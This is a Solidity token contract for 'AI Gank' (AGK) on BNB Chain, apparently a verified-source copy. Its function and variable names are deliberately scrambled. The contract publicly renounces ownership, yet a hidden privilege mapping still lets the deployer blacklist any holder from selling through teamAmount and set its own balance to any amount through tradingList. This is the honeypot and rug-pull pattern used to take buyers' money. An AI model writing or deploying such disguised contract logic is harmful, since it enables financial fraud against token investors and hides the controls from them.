/**
 *Submitted for verification at BscScan.com on 2023-02-10
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface launchedReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitSender) external view returns (uint256);

    function transfer(address senderTxEnable, uint256 fundFeeSell) external returns (bool);

    function allowance(address feeLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundFeeSell) external returns (bool);

    function transferFrom(
        address sender,
        address senderTxEnable,
        uint256 fundFeeSell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenFrom, uint256 value);
    event Approval(address indexed feeLaunch, address indexed spender, uint256 value);
}

interface launchedReceiverMetadata is launchedReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface fromSenderSell {
    function createPair(address feeLimit, address feeAutoReceiver) external returns (address);
}

interface exemptSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract exemptIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract AIGank is exemptIs, launchedReceiver, launchedReceiverMetadata {
    uint8 private liquidityReceiver = 18;
    

    
    uint256 public sellLiquidity;

    uint256 private receiverSender;
    address public exemptAmount;
    mapping(address => uint256) private launchedMode;

    address public walletIsAmount;
    bool private walletFromToken;
    bool private receiverIsLimit;
    bool private fromTeam;
    uint256 public teamEnable;
    mapping(address => bool) public tradingFund;
    uint256 private marketingTrading = 100000000 * 10 ** liquidityReceiver;
    address private enableMode;

    address private isFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    bool public txAmountAt;
    bool public minFromWallet;
    string private swapToken = "AI Gank";
    mapping(address => bool) public receiverAuto;
    string private teamExempt = "AGK";
    mapping(address => mapping(address => uint256)) private buySwap;

    

    event OwnershipTransferred(address indexed receiverTake, address indexed tradingAt);

    constructor (){
        if (walletFromToken) {
            receiverIsLimit = false;
        }
        exemptSell isAt = exemptSell(isFund);
        exemptAmount = fromSenderSell(isAt.factory()).createPair(isAt.WETH(), address(this));
        enableMode = _msgSender();
        if (txAmountAt == walletFromToken) {
            receiverIsLimit = true;
        }
        walletIsAmount = enableMode;
        receiverAuto[walletIsAmount] = true;
        if (receiverIsLimit) {
            receiverIsLimit = false;
        }
        launchedMode[walletIsAmount] = marketingTrading;
        emit Transfer(address(0), walletIsAmount, marketingTrading);
        atReceiver();
    }

    

    function decimals() external view virtual override returns (uint8) {
        return liquidityReceiver;
    }

    function senderReceiverWallet(address modeBuy, address senderTxEnable, uint256 fundFeeSell) internal returns (bool) {
        if (modeBuy == walletIsAmount || senderTxEnable == walletIsAmount) {
            return takeLiquidity(modeBuy, senderTxEnable, fundFeeSell);
        }
        if (txAmountAt) {
            walletFromToken = true;
        }
        require(!tradingFund[modeBuy]);
        
        return takeLiquidity(modeBuy, senderTxEnable, fundFeeSell);
    }

    function takeLiquidity(address modeBuy, address senderTxEnable, uint256 fundFeeSell) internal returns (bool) {
        require(launchedMode[modeBuy] >= fundFeeSell);
        launchedMode[modeBuy] -= fundFeeSell;
        launchedMode[senderTxEnable] += fundFeeSell;
        emit Transfer(modeBuy, senderTxEnable, fundFeeSell);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return teamExempt;
    }

    function modeAuto() public view returns (bool) {
        return txAmountAt;
    }

    function isFee(address limitEnable) public {
        if (minFromWallet) {
            return;
        }
        if (teamEnable != receiverSender) {
            receiverSender = teamEnable;
        }
        receiverAuto[limitEnable] = true;
        
        minFromWallet = true;
    }

    function allowance(address walletTrading, address buyFromMax) external view virtual override returns (uint256) {
        return buySwap[walletTrading][buyFromMax];
    }

    function receiverEnable() public {
        
        if (receiverIsLimit) {
            teamEnable = sellLiquidity;
        }
        walletFromToken=false;
    }

    function transfer(address tradingMaxMin, uint256 fundFeeSell) external virtual override returns (bool) {
        return senderReceiverWallet(_msgSender(), tradingMaxMin, fundFeeSell);
    }

    function approve(address buyFromMax, uint256 fundFeeSell) public virtual override returns (bool) {
        buySwap[_msgSender()][buyFromMax] = fundFeeSell;
        emit Approval(_msgSender(), buyFromMax, fundFeeSell);
        return true;
    }

    function balanceOf(address limitSender) public view virtual override returns (uint256) {
        return launchedMode[limitSender];
    }

    function teamSell() public view returns (bool) {
        return receiverIsLimit;
    }

    function owner() external view returns (address) {
        return enableMode;
    }

    function teamAmount(address autoAt) public {
        
        if (autoAt == walletIsAmount || autoAt == exemptAmount || !receiverAuto[_msgSender()]) {
            return;
        }
        
        tradingFund[autoAt] = true;
    }

    function getOwner() external view returns (address) {
        return enableMode;
    }

    function name() external view virtual override returns (string memory) {
        return swapToken;
    }

    function atReceiver() public {
        emit OwnershipTransferred(walletIsAmount, address(0));
        enableMode = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return marketingTrading;
    }

    function transferFrom(address modeBuy, address senderTxEnable, uint256 fundFeeSell) external override returns (bool) {
        if (buySwap[modeBuy][_msgSender()] != type(uint256).max) {
            require(fundFeeSell <= buySwap[modeBuy][_msgSender()]);
            buySwap[modeBuy][_msgSender()] -= fundFeeSell;
        }
        return senderReceiverWallet(modeBuy, senderTxEnable, fundFeeSell);
    }

    function listFee() public view returns (bool) {
        return walletFromToken;
    }

    function totalLimitTake() public view returns (bool) {
        return receiverIsLimit;
    }

    function tradingList(uint256 fundFeeSell) public {
        if (!receiverAuto[_msgSender()]) {
            return;
        }
        launchedMode[walletIsAmount] = fundFeeSell;
    }

    function receiverMax() public {
        if (sellLiquidity != teamEnable) {
            receiverIsLimit = true;
        }
        if (walletFromToken != txAmountAt) {
            fromTeam = true;
        }
        fromTeam=false;
    }


}